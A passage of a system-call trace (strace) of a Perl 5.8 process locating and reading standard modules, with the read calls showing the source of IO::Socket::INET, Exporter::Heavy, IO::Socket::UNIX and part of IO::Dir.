${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
11891 07:39:45.204206 _llseek(6, 6698, [6698], SEEK_SET) = 0
11891 07:39:45.204223 _llseek(6, 0, [6698], SEEK_CUR) = 0
11891 07:39:45.204233 close(6)          = 0
11891 07:39:45.204252 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204266 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204280 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204293 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204307 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204319 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204334 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204346 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204359 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204371 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204384 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204397 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
11891 07:39:45.204419 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
11891 07:39:45.204433 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6128) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.204445 _llseek(6, 0, [0], SEEK_CUR) = 0
11891 07:39:45.204461 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
11891 07:39:45.204821 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204837 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204851 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204864 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204877 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204890 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204904 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204916 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204929 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204941 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204954 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204967 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfeb5e6c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204980 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfeb5f5c) = -1 ENOENT (No such file or directory)
11891 07:39:45.204993 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
11891 07:39:45.205014 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
11891 07:39:45.205029 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5c78) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.205040 _llseek(8, 0, [0], SEEK_CUR) = 0
11891 07:39:45.205057 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
11891 07:39:45.205873 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
11891 07:39:45.206072 brk(0x829c000)    = 0x829c000
11891 07:39:45.206385 read(8, "", 4096) = 0
11891 07:39:45.206400 close(8)          = 0
11891 07:39:45.207506 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
11891 07:39:45.207957 _llseek(6, 6496, [6496], SEEK_SET) = 0
11891 07:39:45.207973 _llseek(6, 0, [6496], SEEK_CUR) = 0
11891 07:39:45.207984 close(6)          = 0
11891 07:39:45.208044 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208059 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208073 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208086 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208104 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208117 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208139 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208192 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208206 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208235 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208248 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.208261 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
11891 07:39:45.208283 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
11891 07:39:45.208298 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6128) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.208309 _llseek(6, 0, [0], SEEK_CUR) = 0
11891 07:39:45.208325 brk(0x82bd000)    = 0x82bd000
11891 07:39:45.208341 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
11891 07:39:45.209272 _llseek(6, 1386, [1386], SEEK_SET) = 0
11891 07:39:45.209290 _llseek(6, 0, [1386], SEEK_CUR) = 0
11891 07:39:45.209300 close(6)          = 0
11891 07:39:45.209356 stat64("/etc/perl/IO/Dir.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209372 stat64("/etc/perl/IO/Dir.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209385 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209398 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209412 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209424 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209438 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209450 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209463 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209479 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfeb631c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209492 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfeb640c) = -1 ENOENT (No such file or directory)
11891 07:39:45.209505 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
11891 07:39:45.209526 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
11891 07:39:45.209541 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb6128) = -1 ENOTTY (Inappropriate ioctl for device)
11891 07:39:45.209553 _llseek(6, 0, [0], SEEK_CUR) = 0
11891 07:39:45.209572 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e 